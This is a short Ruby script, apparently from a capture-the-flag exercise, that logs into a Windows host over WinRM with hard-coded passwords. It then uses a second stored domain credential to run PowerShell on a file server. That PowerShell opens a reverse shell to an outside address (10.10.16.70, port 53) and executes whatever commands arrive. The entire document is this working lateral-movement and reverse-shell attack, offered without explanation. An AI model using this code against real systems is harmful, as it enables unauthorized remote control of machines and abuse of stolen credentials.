require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'https://127.0.0.1:5986/wsman',
  transport: :ssl,
  user: 'WebUser',
  password: 'M4ng£m£ntPa55',
  :no_ssl_peer_verification => true
)

conn.shell(:powershell) do |shell|
  output = shell.run("$pass = convertto-securestring -AsPlainText -Force -String '++FileServerLogon12345++'; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist 'fulcrum.local\\btables',$pass; Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('10.10.16.70',53); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); }") do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
